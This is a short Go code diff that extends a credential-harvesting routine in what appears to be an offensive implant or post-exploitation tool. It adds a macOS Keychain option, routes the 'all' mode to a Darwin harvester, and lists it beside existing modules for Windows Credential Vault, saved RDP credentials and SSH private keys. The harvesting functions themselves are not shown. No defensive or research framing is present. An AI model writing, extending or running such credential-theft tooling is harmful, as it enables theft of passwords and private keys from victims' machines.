@@ -50,7 +50,15 @@ func HarvestCredentials(target string) ([]byte, error) {
 		return harvestRDPCreds()
 	case "ssh":
 		return harvestSSHKeys()
+	case "keychain":
+		if runtime.GOOS != "darwin" {
+			return []byte("Keychain: macOS-only feature"), nil
+		}
+		return HarvestCredsDarwin(nil)
 	case "all":
+		if runtime.GOOS == "darwin" {
+			return HarvestCredsDarwin(nil)
+		}
 		return harvestAll()
 	default:
 		var sb strings.Builder
@@ -61,6 +69,7 @@ func HarvestCredentials(target string) ([]byte, error) {
 		sb.WriteString("  creds vault       Windows Credential Vault\n")
 		sb.WriteString("  creds rdp         Saved RDP credentials\n")
 		sb.WriteString("  creds ssh         SSH private keys\n")
+		sb.WriteString("  creds keychain    macOS Keychain passwords (macOS only)\n")
 		sb.WriteString("  creds all         Run all modules\n")
 		return []byte(sb.String()), nil
 	}
